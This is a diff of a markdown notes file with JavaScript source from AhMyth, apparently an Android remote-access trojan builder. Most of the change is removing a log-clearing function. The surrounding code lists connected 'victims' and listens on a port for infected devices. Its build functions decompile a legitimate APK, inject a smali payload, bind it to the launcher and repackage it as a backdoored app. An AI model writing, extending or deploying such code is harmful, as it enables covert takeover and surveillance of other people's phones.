@@ -74,118 +74,6 @@ exports.orders = {
 
 }
 ```
-
-## Updated `appController` with clearLogs function
-```js
-app.controller("AppCtrl", ($scope) => {
-    $appCtrl = $scope;
-    $appCtrl.victims = viclist;
-    $appCtrl.isVictimSelected = true;
-    $appCtrl.bindApk = {
-        enable: false, method: 'BOOT'
-    }; //default values for binding apk
-
-    var log = document.getElementById("log");
-    
-    // clear the black gui log box function
-    $appCtrl.clearLogs = () => {
-        $appCtrl.logs = [];
-    };
-
-    $appCtrl.logs = [];
-
-    $('.menu .item')
-    .tab();
-    $('.ui.dropdown')
-    .dropdown();
-
-    const window = remote.getCurrentWindow();
-    $appCtrl.close = () => {
-        window.close();
-    };
-
-    $appCtrl.minimize = () => {
-        window.minimize();
-    };
-
-    $appCtrl.maximize = () => {
-        window.maximize();
-    };
-
-    // when user clicks Listen button
-    $appCtrl.Listen = (port) => {
-        if (!port) {
-            port = CONSTANTS.defaultPort;
-        }
-
-        // notify the main proccess about the port and let him start listening
-        ipcRenderer.send("SocketIO:Listen", port);
-        $appCtrl.Log('[✓] Started Listening on Port: ' + port, CONSTANTS.logStatus.SUCCESS);
-    }
-
-
-    // fired when main proccess (main.js) sends any new notification about new victim
-    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
-        // add the new victim to the list
-        viclist[index] = victimsList.getVictim(index);
-        $appCtrl.Log('[¡] New victim from ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
-        $appCtrl.$apply();
-    });
-
-
-    // fired if listening brings error
-    ipcRenderer.on("SocketIO:Listen", (event, error) => {
-        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
-        $appCtrl.isListen = false;
-        $appCtrl.$apply()
-    });
-
-
-    // fired when main proccess (main.js) send any new notification about disconnected victim
-    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
-        $appCtrl.Log('[¡] Victim Disconnected ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
-        // delete him from list
-        delete viclist[index];
-        $appCtrl.$apply();
-    });
-
-
-    // notify the main proccess (main.js) to open the lab
-    $appCtrl.openLab = (index) => {
-        ipcRenderer.send('openLabWindow', 'lab.html', index);
-    }
-
-    // stop listening when user clicks the Stop button
-
-
-    // app logs to print any new log in the black terminal
-    $appCtrl.Log = (msg, status) => {
-        
-        // clears the black gui log box only if there are logs to clear
-        if ($appCtrl.logs.length > 0) {
-            $appCtrl.clearLogs();
-        }
-
-        var fontColor = CONSTANTS.logColors.DEFAULT;
-        if (status == CONSTANTS.logStatus.SUCCESS) {
-            fontColor = CONSTANTS.logColors.GREEN;
-        } else if (status == CONSTANTS.logStatus.FAIL) {
-            fontColor = CONSTANTS.logColors.RED;
-        } else if (status == CONSTANTS.logStatus.INFO) {
-            fontColor = CONSTANTS.logColors.YELLOW;
-        }
-
-        $appCtrl.logs.push({
-            date: new Date().toLocaleString(), msg: msg, color: fontColor
-        });
-
-        log.scrollTop = log.scrollHeight;
-        if (!$appCtrl.$$phase) {
-            $appCtrl.$apply();
-        }
-    }
-```
-
 ## new `CopyAhmythFilesAndGenerateApk` function
 > contains new smali payload directory creator function
 ```js
@@ -336,8 +224,6 @@ $appCtrl.copyPermissions = (manifest) => {
 ## Updated `BindOnLauncher` function
 ```js
 $appCtrl.BindOnLauncher = (apkFolder) => {
-
-
     delayedLog('[★] Reading the Android Manifest File...\n');
     fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
         if (error) {
@@ -477,9 +363,6 @@ $appCtrl.BindOnLauncher = (apkFolder) => {
 ## Updated `Build` function
 ```js
     $appCtrl.Build = (ip, port, clearLogs = true) => {
-        if (clearLogs) {
-            $appCtrl.clearLogs();
-        }
         
         if (!ip) {
             $appCtrl.Log('[x] IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
@@ -542,9 +425,6 @@ $appCtrl.BindOnLauncher = (apkFolder) => {
                     $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
                 } else {
                     /* Otherwise the function will Decompile, Backdoor & Regenerate an Original APK */
-                    if (clearLogs) {
-                        $appCtrl.clearLogs();
-                    }
                     
                     var filePath = $appCtrl.filePath;
                     if (filePath == null) {
